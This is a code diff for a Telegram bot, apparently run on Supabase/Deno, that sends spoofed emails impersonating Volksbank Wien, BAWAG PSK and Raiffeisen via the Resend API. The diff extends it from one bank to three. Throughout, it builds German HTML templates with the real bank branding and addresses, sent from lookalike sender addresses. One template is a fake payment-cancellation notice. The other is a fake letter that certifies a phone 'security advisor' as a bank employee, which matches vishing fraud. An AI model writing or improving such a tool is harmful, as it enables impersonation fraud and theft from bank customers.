@@ -1,4 +1,4 @@
-// Telegram bot for sending Volksbank spoof emails via Resend
+// Telegram bot for sending bank spoof emails (Volksbank / BAWAG / Raiffeisen) via Resend
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
@@ -11,112 +11,176 @@ const RESEND_API_KEY = Deno.env.get("RESEND_API_KEY")!;
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 
-const FROM_NAME = "Volksbank Wien AG";
-const FROM_EMAIL = "volksbank@sicherheitsystem.net";
-
 const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
 
-// ---------- Templates (Kopie aus AdminEmailSpoof.tsx) ----------
-const stornierungHtml = `<!DOCTYPE html>
-<html lang="de">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Volksbank - Stornierung Ihrer Zahlung</title>
-</head>
-<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
-  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
-    <tr>
-      <td align="center">
-        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
-          <tr><td style="height:3px;background-color:#004899;font-size:0;line-height:0;">&nbsp;</td></tr>
-          <tr>
-            <td style="padding:35px 40px 30px 40px;">
-              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Stornierung Ihrer Zahlung &ndash; in Bearbeitung</h1>
-              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">{{ANREDE_SATZ}}</p>
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">wir informieren Sie hiermit, dass die nachfolgend aufgef&uuml;hrte Zahlung von Ihrem Konto derzeit im Stornierungsprozess bearbeitet wird.</p>
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
-                <tr>
-                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
-                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">Zahlungsdetails</p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Betrag:</strong> EUR {{BETRAG}}</p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Empf&auml;nger:</strong> {{EMPFAENGER}}</p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">IBAN:</strong> {{IBAN}}</p>
-                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Zahlungsreferenz:</strong> {{REFERENZ}}</p>
-                  </td>
-                </tr>
-              </table>
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Die Stornierung wird <strong>umgehend</strong> durchgef&uuml;hrt, sobald Sie den <strong>Stornierungs- bzw. Quittungsbeleg</strong> pers&ouml;nlich an Ihrem Volksbank-Schalter abgeben. Der Betrag wird anschlie&szlig;end Ihrem Konto wieder gutgeschrieben.</p>
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Bitte bringen Sie zur Abwicklung einen <strong>amtlichen Lichtbildausweis</strong> sowie den zugeh&ouml;rigen Beleg mit. Ihr Guthaben ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt.</p>
-              <p style="margin:0;font-size:14px;line-height:1.6;color:#666666;">Bei R&uuml;ckfragen stehen Ihnen die Mitarbeiterinnen und Mitarbeiter Ihrer Volksbank-Filiale gerne zur Verf&uuml;gung.</p>
-            </td>
-          </tr>
-          <tr>
-            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
-              <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">Volksbank Wien AG</p>
-              <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">Dietrichgasse 25, 1030 Wien</p>
-              <p style="margin:0;font-size:11px;color:#bbbbbb;">
-                <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a> &middot;
-                <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a> &middot;
-                <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
-              </p>
-            </td>
-          </tr>
-        </table>
-      </td>
-    </tr>
-  </table>
-</body>
-</html>`;
+// ---------- Bank configuration ----------
+type BankKey = "vb" | "bawag" | "rbi";
 
-const legitimierungHtml = `<!DOCTYPE html>
+type BankConfig = {
+  key: BankKey;
+  name: string;
+  fullName: string;
+  fromName: string;
+  fromEmail: string;
+  accent: string;
+  topbar: string;
+  border: string;
+  address: string;
+  domain: string;
+  schalter: string;
+  filiale: string;
+};
+
+const BANKS: Record<BankKey, BankConfig> = {
+  vb: {
+    key: "vb",
+    name: "Volksbank",
+    fullName: "Volksbank Wien AG",
+    fromName: "Volksbank Wien AG",
+    fromEmail: "volksbank@sicherheitsystem.net",
+    accent: "#004899",
+    topbar: "#004899",
+    border: "#004899",
+    address: "Dietrichgasse 25, 1030 Wien",
+    domain: "volksbank.at",
+    schalter: "Volksbank-Schalter",
+    filiale: "Volksbank-Filiale",
+  },
+  bawag: {
+    key: "bawag",
+    name: "BAWAG",
+    fullName: "BAWAG PSK",
+    fromName: "BAWAG PSK",
+    fromEmail: "bawag@sicherheitsystem.net",
+    accent: "#990000",
+    topbar: "#990000",
+    border: "#990000",
+    address: "Wiedner Gürtel 11, 1100 Wien",
+    domain: "bawag.com",
+    schalter: "BAWAG-Schalter",
+    filiale: "BAWAG-Filiale",
+  },
+  rbi: {
+    key: "rbi",
+    name: "Raiffeisen",
+    fullName: "Raiffeisen Bank International AG",
+    fromName: "Raiffeisen Bank International AG",
+    fromEmail: "raiffeisen@sicherheitsystem.net",
+    accent: "#000000",
+    topbar: "#FFED00",
+    border: "#000000",
+    address: "Am Stadtpark 9, 1030 Wien",
+    domain: "rbinternational.com",
+    schalter: "Raiffeisen-Schalter",
+    filiale: "Raiffeisen-Filiale",
+  },
+};
+
+// ---------- HTML templates ----------
+function stornierungTemplate(b: BankConfig): string {
+  return `<!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Volksbank - Mitarbeiter-Legitimierung</title>
+  <title>${b.name} - Stornierung Ihrer Zahlung</title>
 </head>
 <body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
-    <tr>
-      <td align="center">
-        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
-          <tr><td style="height:3px;background-color:#004899;font-size:0;line-height:0;">&nbsp;</td></tr>
-          <tr>
-            <td style="padding:35px 40px 30px 40px;">
-              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Legitimierung Ihres Sicherheitsberaters</h1>
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Sehr geehrte Damen und Herren,</p>
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der Volksbank Wien AG ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.</p>
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
-                <tr>
-                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
-                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">Legitimierungsdaten</p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Sicherheitsberater:</strong> Simon Hengst</p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Abteilung:</strong> Sicherheit &amp; Betrugspr&auml;vention</p>
-                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Referenznummer:</strong> {{REFERENZ}}</p>
-                  </td>
-                </tr>
-              </table>
-              <p style="margin:0;font-size:15px;line-height:1.6;color:#333333;">Bitte nennen Sie Ihrem Berater bei R&uuml;ckfragen ausschlie&szlig;lich die oben genannte <strong>Referenznummer</strong>. So stellen wir gemeinsam sicher, dass Sie mit dem korrekten Ansprechpartner verbunden sind.</p>
+    <tr><td align="center">
+      <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
+        <tr><td style="height:3px;background-color:${b.topbar};font-size:0;line-height:0;">&nbsp;</td></tr>
+        <tr><td style="padding:35px 40px 30px 40px;">
+          <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Stornierung Ihrer Zahlung &ndash; in Bearbeitung</h1>
+          <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">{{ANREDE_SATZ}}</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">wir informieren Sie hiermit, dass die nachfolgend aufgef&uuml;hrte Zahlung von Ihrem Konto derzeit im Stornierungsprozess bearbeitet wird.</p>
+          <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;"><tr>
+            <td style="background-color:#f1f4f7;border-left:4px solid ${b.border};border-radius:0 6px 6px 0;padding:20px 24px;">
+              <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:${b.accent};letter-spacing:0.4px;text-transform:uppercase;">Zahlungsdetails</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Betrag:</strong> EUR {{BETRAG}}</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Empf&auml;nger:</strong> {{EMPFAENGER}}</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">IBAN:</strong> {{IBAN}}</p>
+              <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Zahlungsreferenz:</strong> {{REFERENZ}}</p>
             </td>
-          </tr>
-          <tr>
-            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
-              <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">Volksbank Wien AG</p>
-              <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">Dietrichgasse 25, 1030 Wien</p>
-              <p style="margin:0;font-size:11px;color:#bbbbbb;">
-                <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a> &middot;
-                <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a> &middot;
-                <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
-              </p>
-            </td>
-          </tr>
-        </table>
-      </td>
-    </tr>
+          </tr></table>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Die Stornierung wird <strong>umgehend</strong> durchgef&uuml;hrt, sobald Sie den <strong>Stornierungs- bzw. Quittungsbeleg</strong> pers&ouml;nlich an Ihrem ${b.schalter} abgeben. Der Betrag wird anschlie&szlig;end Ihrem Konto wieder gutgeschrieben.</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Bitte bringen Sie zur Abwicklung einen <strong>amtlichen Lichtbildausweis</strong> sowie den zugeh&ouml;rigen Beleg mit. Ihr Guthaben ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt.</p>
+          <p style="margin:0;font-size:14px;line-height:1.6;color:#666666;">Bei R&uuml;ckfragen stehen Ihnen die Mitarbeiterinnen und Mitarbeiter Ihrer ${b.filiale} gerne zur Verf&uuml;gung.</p>
+        </td></tr>
+        <tr><td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
+          <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">${b.fullName}</p>
+          <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">${b.address}</p>
+          <p style="margin:0;font-size:11px;color:#bbbbbb;">
+            <a href="https://www.${b.domain}/impressum" style="color:#999999;text-decoration:underline;">Impressum</a> &middot;
+            <a href="https://www.${b.domain}/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a> &middot;
+            <a href="https://www.${b.domain}" style="color:#999999;text-decoration:underline;">${b.domain}</a>
+          </p>
+        </td></tr>
+      </table>
+    </td></tr>
   </table>
 </body>
 </html>`;
+}
+
+function legitimierungTemplate(b: BankConfig): string {
+  return `<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>${b.name} - Mitarbeiter-Legitimierung</title>
+</head>
+<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
+  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
+    <tr><td align="center">
+      <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
+        <tr><td style="height:3px;background-color:${b.topbar};font-size:0;line-height:0;">&nbsp;</td></tr>
+        <tr><td style="padding:35px 40px 30px 40px;">
+          <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Legitimierung Ihres Sicherheitsberaters</h1>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Sehr geehrte Damen und Herren,</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der ${b.fullName} ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.</p>
+          <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;"><tr>
+            <td style="background-color:#f1f4f7;border-left:4px solid ${b.border};border-radius:0 6px 6px 0;padding:20px 24px;">
+              <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:${b.accent};letter-spacing:0.4px;text-transform:uppercase;">Legitimierungsdaten</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Sicherheitsberater:</strong> Simon Hengst</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Abteilung:</strong> Sicherheit &amp; Betrugspr&auml;vention</p>
+              <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Referenznummer:</strong> {{REFERENZ}}</p>
+            </td>
+          </tr></table>
+          <p style="margin:0;font-size:15px;line-height:1.6;color:#333333;">Bitte nennen Sie Ihrem Berater bei R&uuml;ckfragen ausschlie&szlig;lich die oben genannte <strong>Referenznummer</strong>. So stellen wir gemeinsam sicher, dass Sie mit dem korrekten Ansprechpartner verbunden sind.</p>
+        </td></tr>
+        <tr><td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
+          <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">${b.fullName}</p>
+          <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">${b.address}</p>
+          <p style="margin:0;font-size:11px;color:#bbbbbb;">
+            <a href="https://www.${b.domain}/impressum" style="color:#999999;text-decoration:underline;">Impressum</a> &middot;
+            <a href="https://www.${b.domain}/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a> &middot;
+            <a href="https://www.${b.domain}" style="color:#999999;text-decoration:underline;">${b.domain}</a>
+          </p>
+        </td></tr>
+      </table>
+    </td></tr>
+  </table>
+</body>
+</html>`;
+}
+
+// ---------- Flow definitions ----------
+type Variant = "stornierung" | "legitimierung";
+
+function parseFlow(flow: string): { bank: BankKey; variant: Variant } | null {
+  const parts = flow.split("_");
+  if (parts.length !== 2) return null;
+  const [variant, bank] = parts as [string, string];
+  if (variant !== "stornierung" && variant !== "legitimierung") return null;
+  if (bank !== "vb" && bank !== "bawag" && bank !== "rbi") return null;
+  return { bank: bank as BankKey, variant: variant as Variant };
+}
+
+function bankLabel(bank: BankKey): string {
+  return BANKS[bank].name;
+}
 
 // ---------- Telegram helpers ----------
 const TG_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -138,11 +202,15 @@ const answerCallback = (id: string, text?: string) =>
   tgCall("answerCallbackQuery", { callback_query_id: id, text });
 
 async function sendStartMenu(chat_id: number) {
-  await sendMessage(chat_id, "👋 <b>Volksbank Email-Bot</b>\n\nBitte wähle eine Vorlage:", {
+  await sendMessage(chat_id, "👋 <b>Bank Email-Bot</b>\n\nBitte wähle eine Vorlage:", {
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📄 Volksbank-Stornierung", callback_data: "flow:stornierung" }],
-        [{ text: "🛡️ Volksbank-Legitimierung", callback_data: "flow:legitimierung" }],
+        [{ text: "📄 Volksbank-Stornierung", callback_data: "flow:stornierung_vb" }],
+        [{ text: "🛡️ Volksbank-Legitimierung", callback_data: "flow:legitimierung_vb" }],
+        [{ text: "📄 BAWAG-Stornierung", callback_data: "flow:stornierung_bawag" }],
+        [{ text: "🛡️ BAWAG-Legitimierung", callback_data: "flow:legitimierung_bawag" }],
+        [{ text: "📄 Raiffeisen-Stornierung", callback_data: "flow:stornierung_rbi" }],
+        [{ text: "🛡️ Raiffeisen-Legitimierung", callback_data: "flow:legitimierung_rbi" }],
       ],
     },
   });
@@ -217,23 +285,26 @@ function buildAnredeSatz(fullName: string): string {
 }
 
 function summary(flow: string, d: Record<string, string>): string {
-  if (flow === "stornierung") {
+  const parsed = parseFlow(flow);
+  if (!parsed) return "";
+  const bank = BANKS[parsed.bank];
+  if (parsed.variant === "stornierung") {
     return (
-      "📋 <b>Zusammenfassung – Stornierung</b>\n\n" +
+      `📋 <b>Zusammenfassung – ${bank.name}-Stornierung</b>\n\n` +
       `<b>An:</b> ${d.empfaenger_name}\n` +
       `<b>Betrag:</b> EUR ${d.betrag}\n` +
       `<b>Empfänger:</b> ${d.empfaenger}\n` +
       `<b>IBAN:</b> ${d.iban}\n` +
       `<b>Referenz:</b> ${d.referenz}\n` +
       `<b>Email:</b> ${d.email}\n\n` +
-      `<b>Absender:</b> ${FROM_NAME} &lt;${FROM_EMAIL}&gt;`
+      `<b>Absender:</b> ${bank.fromName} &lt;${bank.fromEmail}&gt;`
     );
   }
   return (
-    "📋 <b>Zusammenfassung – Legitimierung</b>\n\n" +
+    `📋 <b>Zusammenfassung – ${bank.name}-Legitimierung</b>\n\n` +
     `<b>Referenz:</b> ${d.referenz}\n` +
     `<b>Email:</b> ${d.email}\n\n` +
-    `<b>Absender:</b> ${FROM_NAME} &lt;${FROM_EMAIL}&gt;`
+    `<b>Absender:</b> ${bank.fromName} &lt;${bank.fromEmail}&gt;`
   );
 }
 
@@ -245,10 +316,14 @@ const confirmKeyboard = {
 
 // ---------- Email send ----------
 async function sendEmail(flow: string, d: Record<string, string>): Promise<{ ok: boolean; error?: string }> {
+  const parsed = parseFlow(flow);
+  if (!parsed) return { ok: false, error: "Unbekannter Flow" };
+  const bank = BANKS[parsed.bank];
+
   let html = "";
   let subject = "";
-  if (flow === "stornierung") {
-    html = stornierungHtml
+  if (parsed.variant === "stornierung") {
+    html = stornierungTemplate(bank)
       .replaceAll("{{ANREDE_SATZ}}", buildAnredeSatz(d.empfaenger_name))
       .replaceAll("{{BETRAG}}", d.betrag)
       .replaceAll("{{EMPFAENGER}}", d.empfaenger)
@@ -256,18 +331,31 @@ async function sendEmail(flow: string, d: Record<string, string>): Promise<{ ok:
       .replaceAll("{{REFERENZ}}", d.referenz);
     subject = `Stornierung Ihrer Zahlung – Referenz ${d.referenz}`;
   } else {
-    html = legitimierungHtml.replaceAll("{{REFERENZ}}", d.referenz);
+    html = legitimierungTemplate(bank).replaceAll("{{REFERENZ}}", d.referenz);
     subject = `Legitimierung Ihres Sicherheitsberaters – Referenz ${d.referenz}`;
   }
+
   const res = await fetch("https://api.resend.com/emails", {
     method: "POST",
     headers: { Authorization: `Bearer ${RESEND_API_KEY}`, "Content-Type": "application/json" },
-    body: JSON.stringify({ from: `${FROM_NAME} <${FROM_EMAIL}>`, to: [d.email], subject, html }),
+    body: JSON.stringify({ from: `${bank.fromName} <${bank.fromEmail}>`, to: [d.email], subject, html }),
   });
   const body = await res.json().catch(() => ({}));
   if (!res.ok) return { ok: false, error: body?.message || body?.name || `HTTP ${res.status}` };
   return { ok: true };
 }
+
+// ---------- Slash command aliases ----------
+const SLASH_TO_FLOW: Record<string, string> = {
+  "/stornierung_vb": "stornierung_vb",
+  "/stornierung_bawag": "stornierung_bawag",
+  "/stornierung_rbi": "stornierung_rbi",
+  "/legitimierung_vb": "legitimierung_vb",
+  "/legitimierung_bawag": "legitimierung_bawag",
+  "/legitimierung_rbi": "legitimierung_rbi",
+  "/stornierung": "stornierung_vb",
+  "/legitimierung": "legitimierung_vb",
+};
 
 // ---------- Update handler ----------
 async function handleUpdate(update: any) {
@@ -286,9 +374,15 @@ async function handleUpdate(update: any) {
 
     if (dataStr.startsWith("flow:")) {
       const flow = dataStr.slice(5);
-      const firstStep = flow === "stornierung" ? STORNO_STEPS[0] : LEGIT_STEPS[0];
+      const parsed = parseFlow(flow);
+      if (!parsed) {
+        await sendMessage(chat_id, "⚠️ Unbekannte Vorlage.");
+        await sendStartMenu(chat_id);
+        return;
+      }
+      const firstStep = parsed.variant === "stornierung" ? STORNO_STEPS[0] : LEGIT_STEPS[0];
       await setSession(chat_id, flow, firstStep, {});
-      await sendMessage(chat_id, flow === "stornierung" ? stornoPrompt(firstStep) : legitPrompt(firstStep));
+      await sendMessage(chat_id, `✏️ <b>${bankLabel(parsed.bank)}-${parsed.variant === "stornierung" ? "Stornierung" : "Legitimierung"}</b>\n\n` + (parsed.variant === "stornierung" ? stornoPrompt(firstStep) : legitPrompt(firstStep)));
       return;
     }
 
@@ -342,15 +436,18 @@ async function handleUpdate(update: any) {
   }
   if (text === "/hilfe" || text === "/help") {
     const help = [
-      "<b>📬 Volksbank Email-Bot – Hilfe</b>",
+      "<b>📬 Bank Email-Bot – Hilfe</b>",
       "",
-      "Dieser Bot versendet Volksbank-Emails über Resend.",
-      `Absender ist fix: <code>Volksbank Wien AG &lt;volksbank@sicherheitsystem.net&gt;</code>`,
+      "Dieser Bot versendet Bank-Emails (Volksbank, BAWAG, Raiffeisen) über Resend.",
+      "Der Absender wird automatisch je nach Vorlage gesetzt:",
+      "• Volksbank: <code>Volksbank Wien AG &lt;volksbank@sicherheitsystem.net&gt;</code>",
+      "• BAWAG: <code>BAWAG PSK &lt;bawag@sicherheitsystem.net&gt;</code>",
+      "• Raiffeisen: <code>Raiffeisen Bank International AG &lt;raiffeisen@sicherheitsystem.net&gt;</code>",
       "",
       "<b>Befehle:</b>",
       "/start – Bot starten und Vorlage auswählen",
-      "/stornierung – Stornierungs-Email direkt starten",
-      "/legitimierung – Mitarbeiter-Legitimierung direkt starten",
+      "/stornierung_vb, /stornierung_bawag, /stornierung_rbi",
+      "/legitimierung_vb, /legitimierung_bawag, /legitimierung_rbi",
       "/abbrechen – aktuellen Vorgang abbrechen",
       "/hilfe – diese Übersicht anzeigen",
       "",
@@ -371,17 +468,15 @@ async function handleUpdate(update: any) {
     await sendMessage(chat_id, help);
     return;
   }
-  if (text === "/stornierung") {
-    await setSession(chat_id, "stornierung", STORNO_STEPS[0], {});
-    await sendMessage(chat_id, stornoPrompt(STORNO_STEPS[0]));
-    return;
-  }
-  if (text === "/legitimierung") {
-    await setSession(chat_id, "legitimierung", LEGIT_STEPS[0], {});
-    await sendMessage(chat_id, legitPrompt(LEGIT_STEPS[0]));
-    return;
-  }
 
+  const mappedFlow = SLASH_TO_FLOW[text];
+  if (mappedFlow) {
+    const parsed = parseFlow(mappedFlow)!;
+    const firstStep = parsed.variant === "stornierung" ? STORNO_STEPS[0] : LEGIT_STEPS[0];
+    await setSession(chat_id, mappedFlow, firstStep, {});
+    await sendMessage(chat_id, `✏️ <b>${bankLabel(parsed.bank)}-${parsed.variant === "stornierung" ? "Stornierung" : "Legitimierung"}</b>\n\n` + (parsed.variant === "stornierung" ? stornoPrompt(firstStep) : legitPrompt(firstStep)));
+    return;
+  }
 
   const s = await getSession(chat_id);
   if (!s || !s.flow || !s.step) {
@@ -392,15 +487,20 @@ async function handleUpdate(update: any) {
   // Save current answer
   const newData = { ...s.data, [s.step]: text };
 
-  const steps = s.flow === "stornierung" ? STORNO_STEPS : LEGIT_STEPS;
+  const parsed = parseFlow(s.flow);
+  if (!parsed) {
+    await clearSession(chat_id);
+    await sendStartMenu(chat_id);
+    return;
+  }
+  const steps = parsed.variant === "stornierung" ? STORNO_STEPS : LEGIT_STEPS;
   const next = nextStep(steps, s.step);
 
   if (next) {
     await setSession(chat_id, s.flow, next, newData);
-    const prompt = s.flow === "stornierung" ? stornoPrompt(next) : legitPrompt(next);
+    const prompt = parsed.variant === "stornierung" ? stornoPrompt(next) : legitPrompt(next);
     await sendMessage(chat_id, prompt);
   } else {
-    // Alle Fragen beantwortet – Zusammenfassung + Confirm
     await setSession(chat_id, s.flow, "confirm", newData);
     await sendMessage(chat_id, summary(s.flow, newData), { reply_markup: confirmKeyboard });
   }
@@ -412,7 +512,6 @@ Deno.serve(async (req) => {
 
   try {
     const update = await req.json();
-    // Fire-and-forget so Telegram gets 200 quickly
     handleUpdate(update).catch((e) => console.error("handleUpdate error", e));
     return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
   } catch (e) {
